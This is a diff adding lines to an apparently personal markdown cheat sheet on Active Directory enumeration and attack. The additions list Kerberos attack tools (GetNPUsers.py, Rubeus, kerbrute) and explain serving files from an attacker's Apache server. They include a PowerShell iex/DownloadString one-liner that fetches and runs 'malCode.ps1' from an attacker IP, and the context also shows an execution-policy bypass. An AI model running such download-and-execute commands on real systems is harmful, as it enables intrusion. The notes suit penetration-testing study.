@@ -10,6 +10,8 @@ Ps> `powershell -ExecutionPolicy bypass`
 [-] shortcuts
 ctrl + L > clean 
 
+[-] put your tools in `/var/www/html` and run `service apache2 start` 
+
 ---
 
 ### Domain Enumeration
@@ -438,3 +440,18 @@ Defending Against Active Directory Enumeration
 - https://gallery.technet.microsoft.com/Net-Cease-Blocking-Net-1e8dcb5b
 - After Downloading NetCease.ps1 run it on the DC .\NetCease.ps1 Then restart server service by typing (Restart-Service -Name Server -Force) now no user can query Get-NetSession
 - To disable NetCease type (.\NetCease.ps1 -Revert) Then restart server service by typing (Restart-Service -Name Server -Force)
+---
+
+Tools :
+/usr/share/doc/python3-impacket/examples/GetNPUsers.py
+
+rubeus.exe
+
+k> kerbrute
+
+
+at `/var/www/html` we run `service apache2 start` to make kali ip like website 
+then use :
+``` Powershell
+iex (new-Object Net.WebClient).DownloadString('https://192.168.152.12/malCode.ps1')
+```
